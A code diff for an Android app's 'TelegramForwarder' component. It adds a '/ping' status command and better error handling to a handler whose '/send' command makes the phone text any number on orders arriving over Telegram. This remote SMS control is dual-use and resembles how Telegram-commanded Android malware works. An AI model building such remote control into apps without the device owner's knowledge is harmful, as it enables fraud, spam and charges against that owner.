@@ -133,6 +133,12 @@ object TelegramForwarder {
     }
 
     private fun handleCommand(context: Context, text: String) {
+        if (text.trim().equals("/ping", ignoreCase = true)) {
+            sendSystemMessage(context, "✅ Bot is active and polling successfully!\nSend SMS permission: " + 
+                (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED))
+            return
+        }
+        
         if (text.startsWith("/send ", ignoreCase = true)) {
             val parts = text.split(" ", limit = 3)
             if (parts.size >= 3) {
@@ -154,11 +160,16 @@ object TelegramForwarder {
                 android.telephony.SmsManager.getDefault()
             }
             
-            smsManager?.sendTextMessage(number, null, messageText, null, null)
+            if (smsManager == null) {
+                sendSystemMessage(context, "❌ Failed: SmsManager is null on this device.")
+                return
+            }
+            
+            smsManager.sendTextMessage(number, null, messageText, null, null)
             sendSystemMessage(context, "✅ SMS sent successfully to $number\nMessage: $messageText")
         } catch (e: Exception) {
             Log.e("TelegramForwarder", "Failed to send SMS: ${e.message}")
-            sendSystemMessage(context, "❌ Failed to send SMS to $number\nError: ${e.message}")
+            sendSystemMessage(context, "❌ Failed to send SMS to $number\nError: ${e.message}\nMake sure SEND_SMS permission is granted.")
         }
     }
 }
